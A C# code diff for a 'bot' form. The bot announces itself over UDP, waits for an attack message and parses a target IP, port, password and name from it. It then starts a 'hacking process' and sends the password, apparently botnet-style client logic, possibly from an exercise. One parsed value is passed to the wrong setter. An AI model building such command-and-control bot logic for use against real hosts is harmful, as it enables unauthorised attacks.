@@ -55,6 +55,72 @@ namespace bot
         private void button4_Click(object sender, EventArgs e)
         {
             udpbot.BotAnnouncment(PortTextBox.Text);
+            var data = udpbot.WaitForAttack();
+            string IP = ParseIP(data,0,4);
+            tcpClient.SetServerIPAddress(IP);
+            
+            string port = ParsePort(data, 4, 2);
+            tcpClient.SetPortNumber(port);
+            
+            string pass = ParsePass(data, 6, 6);
+            tcpClient.SetPortNumber(port);
+            
+            string ShonName = ParseShobName(data, 12, 32);
+            tcpClient.SetShobName(ShonName);
+            
+            tcpClient.StartHackingProcess();
+            tcpClient.SendThePassword(pass);
+            
+        }
+
+        private string ParseIP(byte[] data, int start, int length)
+        {
+            
+            byte[] res = new byte[length];
+            for (var i = start; i < start + length; i++)
+                res[i - start] = data[i];
+            string s = "";
+            for (var i=0;i<4;i++)
+            {
+                if (i < 3)
+                    s += res[i] + ".";
+                else
+                    s += res[i];
+            }
+            return s;
+        }
+
+        private string ParsePort(byte[] data, int start, int length)
+        {
+
+            byte[] res = new byte[length];
+            for (var i = start; i < start + length; i++)
+                res[i - start] = data[i];
+            int result = res[0] + res[1] * 256;
+            return result.ToString(); 
+        }
+
+        private string ParsePass(byte[] data, int start, int length)
+        {
+
+            byte[] res = new byte[length];
+            for (var i = start; i < start + length; i++)
+                res[i - start] = data[i];
+            string s = "";
+            string s2 = System.Text.Encoding.ASCII.GetString(res);
+            string cleaned = s2.Replace("\0", "");
+            return cleaned;
+        }
+
+        private string ParseShobName(byte[] data, int start, int length)
+        {
+
+            byte[] res = new byte[length];
+            for (var i = start; i < start + length; i++)
+                res[i - start] = data[i];
+            string s2 = System.Text.Encoding.ASCII.GetString(res);
+            string cleaned = s2.Replace("\0", "");
+            return cleaned;
         }
     }
 }
